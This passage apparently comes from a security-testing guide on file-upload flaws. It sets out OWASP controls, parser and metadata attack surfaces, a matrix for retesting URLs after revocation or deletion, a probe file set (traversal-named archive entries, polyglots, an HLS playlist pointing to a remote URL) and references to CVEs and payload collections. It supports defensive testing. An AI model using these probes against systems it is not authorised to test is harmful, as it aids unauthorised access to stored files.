- Least-privilege filesystem permissions on the upload directory, plus **CSRF protection** on the upload endpoint and an **AV/sandbox** and **CDR (Content Disarm & Reconstruct)** pass for PDF/DOCX-class files, are the documented controls; their absence is the hunt surface. [T1 OWASP]
- Image content validation by rewrite/randomization destroys injected payloads; **Apache POI** is the recommended validator for Microsoft documents; **ZIP is explicitly not recommended** because of its attack surface. [T1 OWASP]
- Image/office/media **parsers are a code-execution surface**: OWASP lists the ImageMagick parser exploit ("ImageTragick") and XXE via document parsing as top malicious-file threats, alongside archive bombs and client-side active content. Validator and renderer are frequently *different* libraries and versions. [T1 OWASP] [T2 research]

### Metadata and embedded-content paths

- Metadata (EXIF, XMP, document properties, media atoms) is frequently parsed by a *different* library than the byte-serving layer and reflected into preview HTML, listings, or maps — canary the values and read them back in the second session. [T1 OWASP]
- Metadata is also the **execution** surface for metadata parsers (ExifTool/DjVu) and the **retention** surface for CDN transforms (`metadata=keep` preserves GPS; `copyright` is the JPEG default and drops the rest; other output formats drop all metadata). [T1 oss-sec] [T1 Cloudflare]
- Office documents (DOCX/OOXML) and PDFs are handled by dedicated validators and renderers: OWASP recommends **Apache POI** for Microsoft documents and **CDR** for PDF/DOCX-class files, so the type check, the CDR pass, and the renderer are three separate components that can disagree. [T1 OWASP]
- Macros, embedded objects, and external relationships inside a document container are separate parse paths from the top-level type check — treat the container as untrusted even when the outer type validates. [T1 OWASP]
- Because the *served* artifact and the *parsed* artifact can differ, always compare the uploaded byte hash, the served byte hash, the transformed-variant hash, and the canary recovered from any derived output.

### Lifecycle transition matrix (re-request every known URL after each event)

| Transition | URLs to re-request | Sessions to compare | Oracle |
|---|---|---|---|
| Permission downgrade | original, preview, thumbnail, text-extract, version, share | downgraded + clean | a denied path still returns bytes |
| Share expiry | signed / share URL | clean | fetch succeeds after stated expiry |
| Revocation | share + signed URL | clean | fetch succeeds after revoke |
| Version restore | version-id, history | owner + second | prior bytes resurrect |
| Delete | every known URL + CDN edge | anonymous | cache HIT survives to expiry |
| Delete (transforms) | `/cdn-cgi/image/<opts>/<src>`, `?width=`/`?blur=`, IO variant | anonymous | derived variant still returns pixels |
| Key rotation | old signed URL + share | clean | old signature still validates |
| Config upload | unlisted extension in served dir | clean | handler executes / serves as code |
| Metadata edit | preview, listing, map/geo view | second + clean | stale or new canary reflected |
| Resource-limit change | bomb-shaped file | owner | guard disabled/re-enabled |

### Probe file set (one benign file per class)

- Image: PNG, JPEG, GIF, SVG (`image/svg+xml` is scriptable), WEBP.
- Document: PDF (`%PDF-`), `text/plain`, and an office/OOXML (ZIP-based) file.
- Archive: ZIP (`PK\x03\x04`) and tar (`\x1f\x8b\x08`) carrying a traversal-named entry; plus one nested archive whose *inner* entry traverses.
- Media: MP4 (`ftyp`), WEBM, a font (`wOFF`/`wOF2`), and an HLS playlist (`.m3u8`) whose segment list references a controlled remote URL.
- Polyglot: one file valid as both a raster image and HTML (for serve-time content-type override tests).
- For each, record extension, declared content-type, magic bytes, and served disposition before probing.

## References

- [T0 standards] WHATWG MIME Sniffing Standard (1445-byte header, image/archive/font signatures, scriptable types, `nosniff`): https://mimesniff.spec.whatwg.org/
- [T0 standards] RFC 6266 — Content-Disposition in HTTP (`inline`/`attachment`, advisory filename, path-stripping): https://www.rfc-editor.org/rfc/rfc6266
- [T0 standards] RFC 5987 — charset/language encoding for header parameters (`filename*`): https://www.rfc-editor.org/rfc/rfc5987
- [T1 vendor] Python `tarfile` — extraction filters (`fully_trusted`/`tar`/`data`; 3.12 added, 3.14 default `data`; `LinkFallbackError`): https://docs.python.org/3/library/tarfile.html#extraction-filters ; PEP 706: https://peps.python.org/pep-0706/
- [T1 vendor] CPython `zipfile` source — member-name normalization (drive/UNC re-rooting, `''`/`.`/`..` component dropping, `_ignore_invalid_names`): https://raw.githubusercontent.com/python/cpython/main/Lib/zipfile/__init__.py
- [T1 vendor] OWASP File Upload Cheat Sheet (extension bypasses, NTFS ADS, 8.3 short names, `.htaccess`/`web.config`, random filename, storage priority, AV/CDR, IDS04-J, POI): https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
- [T1 vendor] AWS — Download and upload objects with presigned URLs (expiry/revocation, SigV4 7-day, `s3:signatureAge`, `aws:SourceIp`): https://docs.aws.amazon.com/AmazonS3/latest/userguide/using-presigned-url.html
- [T1 vendor] AWS CloudFront — Use signed URLs (canned vs custom policy, key groups, per-request expiry check, query-string signing): https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/private-content-signed-urls.html
- [T1 vendor] Microsoft Learn — Shared access signatures overview (types, bearer token, no generation audit, stored access policy limits): https://learn.microsoft.com/en-us/azure/storage/common/storage-sas-overview
- [T1 vendor] Microsoft Learn — Create a user delegation SAS (7-day key/expiry maximum, revocation by key or RBAC/POSIX ACL): https://learn.microsoft.com/en-us/rest/api/storageservices/create-user-delegation-sas
- [T1 vendor] Google Cloud Storage — Signed URLs (`X-Goog-Expires` max 604800 s, key rotation, signed headers, resumable session URI): https://cloud.google.com/storage/docs/access-control/signed-urls ; canonical requests: https://cloud.google.com/storage/docs/authentication/canonical-requests
- [T1 vendor] Cloudflare Images — Serve private images (signed URL `exp`/`sig` HMAC construction): https://developers.cloudflare.com/images/optimization/hosted-images/serve-private-images/
- [T1 vendor] Cloudflare Images — Features/URL interface (`/cdn-cgi/image/<OPTIONS>/<SOURCE-IMAGE>`, absolute source URLs, `blur`, `metadata`, `format=json`, `onerror=redirect`, caching and purge semantics): https://developers.cloudflare.com/images/optimization/features/
- [T1 vendor] imgix — Securing Assets (MD5 `s` parameter, 403 on alteration, `expires` semantics): https://docs.imgix.com/en-US/getting-started/setup/securing-assets
- [T1 vendor] imgproxy — Signing a URL (HMAC-SHA256 over salt + path, disabled by default): https://docs.imgproxy.net/usage/signing_url ; configuration options (`IMGPROXY_ALLOWED_SOURCES`): https://docs.imgproxy.net/configuration/options
- [T1 vendor] Fastly — Image Optimizer reference (variant caching, origin `Vary` removal, 60 s minimum TTL for transformed images): https://www.fastly.com/documentation/reference/io/
- [T1 vendor] ImageMagick — Security Policy (allow-unless-denied, last-rule-wins, policy domains and rights, named policies, `--with-security-policy`, `--with-frozenpaths`, `identify -list policy`): https://imagemagick.org/security-policy/
- [T1 vendor] Red Hat — CVE-2023-36664 Ghostscript pipe-device command injection (`%pipe%`/`|`, `.invalidfileaccess` under `-dSAFER`, RHSA-2023:5459): https://access.redhat.com/security/cve/cve-2023-36664
- [T1 vendor] GitHub Advisory — GHSA-f88m-g3jw-g9cj sharp/libvips inherited CVEs (CVE-2026-33327/33328/35590/35591; sharp 0.35.0, libvips 8.18.3; `sharp.block` workaround): https://github.com/advisories/GHSA-f88m-g3jw-g9cj
- [T1 vendor] NVD — CVE-2025-29769 libvips heap buffer overflow: https://nvd.nist.gov/vuln/detail/cve-2025-29769
- [T1 vendor] Pillow — Image module (`MAX_IMAGE_PIXELS`, `DecompressionBombWarning`, `DecompressionBombError` at 2×; disabling and escalating): https://pillow.readthedocs.io/en/stable/reference/Image.html ; default constant: https://raw.githubusercontent.com/python-pillow/Pillow/main/src/PIL/Image.py
- [T1 vendor] MDN — `X-Content-Type-Options` (script/style blocking plus sniffing disabled for other response types, including navigations): https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/X-Content-Type-Options
- [T1 vendor] MDN — `<a>` `download` attribute (same-origin or `blob:`/`data:` only; separator rewriting): https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/a
- [T2 research] Snyk — Zip Slip (tar/jar/war/cpio/apk/rar/7z traversal; JS/Ruby/.NET/Go ecosystems; CVE-2018-1002203, CVE-2018-1002207, adm-zip): https://security.snyk.io/research/zip-slip-vulnerability
- [T2 research] Codean Labs — CVE-2024-4367 arbitrary JavaScript execution in PDF.js (`FontMatrix` → `new Function`, `isEvalSupported`, fixed 4.2.67): https://codeanlabs.com/2024/05/cve-2024-4367-arbitrary-js-execution-in-pdf-js/
- [T2 research] oss-security — CVE-2021-22204 ExifTool DjVu arbitrary code execution (7.44–12.23, fixed 12.24): https://seclists.org/oss-sec/2021/q2/108
- [T2 research] oss-security — CVE-2017-11421 gnome-exe-thumbnailer VBScript injection via MSI filename (thumbnailer auto-execution on untrusted files): https://www.openwall.com/lists/oss-security/2017/07/19/3
- [T2 research] oss-security — FFmpeg HLS+concat local file read and SSRF (`concat:http://...|file:///...`, CVEs 2016-1897/1898, thumbnailer trigger): https://seclists.org/oss-sec/2016/q1/85
- [T2 research] Voorivex — Content-Type override to stored XSS on public objects (MinIO `response-*` allowlist, S3 anonymous-override refusal, presigned re-sign): https://blog.voorivex.team/content-type-override-to-stored-xss-on-public-objects
- [T2 research] ImageTragick — ImageMagick parsing exploit: https://imagetragick.com/ (referenced by the OWASP File Upload Cheat Sheet)
- [T1 vendor] Ruby on Rails Security Guide (default `X-Content-Type-Options: nosniff` and other default headers): https://guides.rubyonrails.org/security.html
- [T1 vendor] OWASP guidance on unrestricted file upload handling and access-control differentials
- [T2 research] XXE payloads and guards (PayloadsAllTheThings): https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md ; upload bypasses: https://swisskyrepo.github.io/PayloadsAllTheThings/Upload%20Insecure%20Files/
- [T2 research] XXE via image upload lab: https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload ; XXE reference: https://hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html
- [T2 research] File-upload attack guide: https://hackviser.com/tactics/pentesting/web/file-upload ; zip-slip/upload/XXE patterns: https://vibe-eval.com/patterns/file-upload-zip-slip-xxe/
- [T0 standards] HTTP disposition, content-type, and sniffing semantics in current fetch and MIME-sniffing standards (Fetch: https://fetch.spec.whatwg.org/)
- web-browser/browser.md for canonical stored and renderer XSS detail referenced by this pack
- parsers-injection/parsers.md for canonical SSTI, XXE, and deserialization detail referenced by this pack
